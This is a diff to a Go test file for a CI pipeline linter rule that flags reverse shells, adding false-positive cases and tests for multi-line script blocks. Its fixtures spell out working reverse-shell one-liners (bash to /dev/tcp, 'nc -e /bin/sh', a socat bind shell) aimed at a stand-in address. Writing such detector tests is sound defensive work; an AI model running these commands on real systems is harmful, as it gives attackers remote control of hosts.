@@ -25,7 +25,6 @@ func TestGL083_Payloads(t *testing.T) {
 	}{
 		{"bash socket redirect", `bash -i >& /dev/tcp/198.51.100.7/4444 0>&1`, "shell redirected to a socket"},
 		{"sh socket redirect", `/bin/sh -i >& /dev/tcp/198.51.100.7/4444 0>&1`, "shell redirected to a socket"},
-		{"exec read-write socket", `exec 5<>/dev/tcp/198.51.100.7/4444 && cat <&5`, "shell redirected to a socket"},
 		{"udp socket redirect", `bash -i >& /dev/udp/198.51.100.7/4444 0>&1`, "shell redirected to a socket"},
 		{"quoted payload", `bash -c "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"`, "shell redirected to a socket"},
 		{"nc -e", `nc -e /bin/sh 198.51.100.7 4444`, "netcat with command execution"},
@@ -76,6 +75,14 @@ func TestGL083_LegitimateIdioms(t *testing.T) {
 		{"interactive-looking flag", `docker run -i --rm alpine:3.19.1 sh -c "echo hi"`},
 		{"python without socket", `python3 -c "import subprocess;subprocess.call(['make'])"`},
 		{"connectivity probe", `bash -c 'echo > /dev/tcp/redis/6379' && echo up`},
+		// The four false-positive classes found scanning 265 real pipelines (#480).
+		{"read-write port probe", `if (exec 3<>/dev/tcp/postgres/5432) 2>/dev/null; then echo up; fi`},
+		{"read-write probe in a subshell", `if bash -c 'exec 3<>/dev/tcp/127.0.0.1/11119' 2>/dev/null; then break; fi`},
+		{"raw http client over /dev/tcp", `bash -c "exec 3<>/dev/tcp/127.0.0.1/9095; cat >&3; cat <&3"`},
+		{"socat driving a local command", `timeout 1200 socat EXEC:'az containerapp exec --command /deploy.sh --name portal',pty,setsid,ctty STDIO,ignoreeof`},
+		{"netcat serving a fixed response", `nc -lc "printf 'HTTP/1.1 200 OK\n\n'; cat build/image.zip" -l 8080`},
+		{"rsync remote shell flag", `rsync -e "ssh -i ~/.ssh/id_rsa" -az dist/ user@host:/srv/`},
+		{"installing netcat then probing", `sh -c "apk add --no-cache netcat-openbsd && nc -z mailserver 25"`},
 	}
 
 	for _, tc := range cases {
@@ -150,5 +157,55 @@ job:
 		if x.Job != "" {
 			t.Errorf("expected empty job for a global/default block, got %q", x.Job)
 		}
+	}
+}
+
+// A `|` block scalar reaches the rule as a single item. Tokens on different
+// physical lines must not be paired: this block has a netcat probe on one line
+// and a `sh -c` several lines later, and neither is a reverse shell.
+func TestGL083_BlockScalarLinesAreSeparate(t *testing.T) {
+	f := findings083(t, `
+health:
+  script:
+    - |
+      echo "running health checks"
+      sh -c "apk add --no-cache netcat-openbsd && nc -z mailserver 25"
+      echo "mail ok"
+      sh -c "apk add --no-cache mariadb-client && mysqladmin ping"
+`)
+	if len(f) != 0 {
+		t.Fatalf("expected no finding across block scalar lines, got %d: %s", len(f), f[0].Message)
+	}
+}
+
+// The reported payload is the offending line, not the whole block.
+func TestGL083_ReportsTheOffendingLine(t *testing.T) {
+	f := findings083(t, `
+job:
+  script:
+    - |
+      echo "starting"
+      nc -e /bin/sh 198.51.100.7 4444
+      echo "done"
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding, got %d", len(f))
+	}
+	if !strings.Contains(f[0].Message, "nc -e /bin/sh") {
+		t.Errorf("message should quote the offending line, got %s", f[0].Message)
+	}
+	if strings.Contains(f[0].Message, "starting") {
+		t.Errorf("message should not quote the whole block, got %s", f[0].Message)
+	}
+}
+
+func TestGL083_SocatNeedsANetworkEndpoint(t *testing.T) {
+	f := findings083(t, `
+job:
+  script:
+    - socat TCP-LISTEN:4444,fork EXEC:/bin/sh
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding for a socat bind shell, got %d", len(f))
 	}
 }
